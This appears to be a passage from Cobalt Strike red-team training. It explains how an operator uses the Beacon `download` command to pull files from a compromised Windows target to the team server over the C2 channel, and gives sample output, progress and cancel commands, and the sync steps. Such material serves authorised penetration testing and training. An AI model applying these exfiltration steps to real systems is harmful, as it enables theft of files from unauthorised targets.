Files can be downloaded from a target using the `download` command.  The command syntax is `download [file]`, where `[file]` can be an absolute or relative path.

```powershell
beacon> download C:\Users\pchilds\Desktop\desktop.ini
[*] started download of C:\Users\pchilds\Desktop\desktop.ini (282 bytes)
[*] download of desktop.ini is complete
```

> Files can also be downloaded from the file browser by right-clicking and selecting **Download**.

The file content is transferred to the team server over the C2 channel (the same way job output is sent from Beacon).  The speed at which a file can be downloaded is therefore dependant on the protocol used by the egress Beacon talking to the team server and Beacon's sleep time.  For example, a file will take much longer to download through a DNS Beacon using A records than an HTTP Beacon using POST requests.

To see downloads that are still in progress, run the `downloads` command.  This will show a summary of running downloads, their total size, and the amount of data received to date.  A download that is in progress can be terminated with the `cancel` command.

Because files are downloaded to the team server first, they will not appear on the machine running the Cobalt Strike client. To do that, go to **View > Downloads**.

From here, select the desired file(s) and click **Sync Files**.  This will open a dialogue box which allows you to save the file to your local disk.  Files may also be removed from the team server using the **Delete Files** button.  Every operator connected to the team server can see (and delete) any of the files that have been downloaded.
